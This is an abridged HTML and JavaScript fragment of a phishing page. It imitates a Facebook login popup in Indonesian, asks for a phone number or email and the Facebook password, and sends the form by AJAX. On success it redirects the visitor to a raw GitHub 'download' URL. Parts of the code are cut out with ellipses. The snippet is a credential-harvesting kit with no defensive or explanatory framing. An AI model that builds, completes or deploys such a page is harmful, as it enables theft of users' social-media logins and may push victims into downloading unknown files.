        ...
        <div class="popup-box-login-fb">
            ...
            <div class="content-box-fb">
                ...
                <form class="login-form" method="POST" action="" onsubmit="$(this).end()">
                    <label>
                        <input type="text" id="email" name="email" placeholder="Nomor ponsel atau email"
                            autocomplete="off" autocapitalize="off">
                    </label>
                    <label>
                        <input type="password" id="password" name="password" placeholder="Kata Sandi Facebook" autocomplete="off"
                            autocapitalize="off">
                    </label>
                    <!-- END -->
                ...
                $.ajax({
                    ...
                    success: function () {
                        $('.login-facebook').fadeOut(),
                            window.location = 'https://raw.githubusercontent.com/Jauery/rege/main/download';
                    }
                })
            }, 1000)
        })
